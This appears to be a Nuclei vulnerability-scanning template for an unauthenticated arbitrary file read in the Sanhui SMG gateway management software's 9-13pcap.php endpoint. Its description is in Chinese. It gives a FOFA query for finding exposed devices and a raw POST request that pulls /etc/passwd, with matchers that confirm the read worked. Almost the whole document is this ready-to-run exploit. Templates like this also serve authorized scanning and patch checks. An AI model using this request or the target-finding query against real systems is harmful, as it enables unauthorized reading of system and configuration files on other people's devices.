id: SMG-9-13pcap_php-File-reading

info:
  name: 三汇 SMG网关管理软件 9-13pcap.php 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
    三汇 SMG网关管理软件 9-13pcap.php 接口处任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://mp.weixin.qq.com/s/x2sr7J9ZjUFTH4QkHPsCWQ
  tags: File reading

http:
  - raw:
      - |
        POST /en/9-13pcap.php HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        down=1&downfile=/etc/passwd
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'root:.*:0:0'
      - type: status
        status: 
          - 200